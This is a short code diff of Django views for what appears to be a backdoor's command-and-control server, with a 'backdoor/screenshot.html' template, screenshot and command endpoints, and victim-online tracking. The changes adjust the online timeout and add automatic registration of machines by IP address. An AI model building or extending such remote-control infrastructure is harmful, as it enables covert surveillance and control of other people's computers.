@@ -36,7 +36,7 @@ def ajax(request, pk):
 
 def check_pc_online(request, pk):
     computer = Computer.objects.all().filter(id=pk)[0]
-    within_3_seconds = timezone.now() - timedelta(seconds=5)
+    within_3_seconds = timezone.now() - timedelta(seconds=10)
     if within_3_seconds > computer.last_online:
         return JsonResponse({"data":"offline"})
     else:
@@ -59,12 +59,16 @@ def screenshot(request):
     
     return render(request, "backdoor/screenshot.html", {'form':form})
 
-def get_id(request, ip, name):
-    computer = Computer.objects.get(ip=ip, name=name)
+def get_id(request, ip):
+    try:
+        computer = Computer.objects.get(ip_addr=ip)
+    except:
+        computer = Computer.objects.create(ip_addr=ip)
     return JsonResponse({'id':computer.id})
 def ping(request, pk):
     computer = Computer.objects.get(id=pk)
     computer.last_online = timezone.now()
+    computer.save()
     return JsonResponse({})
     
 def commands(request, pk):
